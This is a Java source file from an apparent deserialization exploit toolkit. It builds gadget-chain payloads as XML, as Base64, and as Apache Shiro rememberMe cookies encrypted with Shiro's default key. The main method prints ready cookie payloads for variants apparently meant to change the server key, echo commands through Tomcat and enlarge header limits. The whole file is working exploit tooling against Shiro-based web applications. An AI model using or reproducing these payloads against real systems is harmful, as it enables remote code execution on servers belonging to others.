package com.ding0x0.yso;

import com.ding0x0.yso.payloads.*;
import com.thoughtworks.xstream.XStream;
import org.apache.shiro.crypto.CipherService;
import org.apache.shiro.util.ByteSource;
import org.apache.tomcat.util.codec.binary.Base64;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import org.apache.shiro.web.mgt.CookieRememberMeManager;

public class Main {
    public String getPayloadToXML(Class clazz) throws Exception {
        ObjectPayload obj = (ObjectPayload) clazz.newInstance();
        Object payload = obj.getObject("sb");
        XStream xStream = new XStream();
        return xStream.toXML(payload);
    }

    public String getPayloadToBase64(Class clazz) throws Exception{
        ObjectPayload obj = (ObjectPayload) clazz.newInstance();
        Object payload = obj.getObject("sb");
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(payload);
        byte[] bytes = byteArrayOutputStream.toByteArray();
        return Base64.encodeBase64String(bytes);
    }

    public String getShiroPayload(Class clazz) throws Exception{
        ObjectPayload obj = (ObjectPayload) clazz.newInstance();
        Object payload = obj.getObject("sb");
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(payload);
        byte[] bytes = byteArrayOutputStream.toByteArray();
        CookieRememberMeManager cookieRememberMeManager = new CookieRememberMeManager();
        CipherService cipherService = cookieRememberMeManager.getCipherService();
        byte[] key = cookieRememberMeManager.getCipherKey();
        ByteSource source = cipherService.encrypt(bytes, key);
        return source.toBase64();
    }


    public static void main(String[] args) throws Exception {
        System.out.println(new Main().getShiroPayload(CommonsCollections2ModifyKey.class));
        System.out.println("==========================");
        System.out.println(new Main().getShiroPayload(CommonsCollections2MyTomcatEcho2.class));
        System.out.println("==========================");
        System.out.println(new Main().getShiroPayload(CommonsCollections2MaxHeaderSize.class));
    }
}
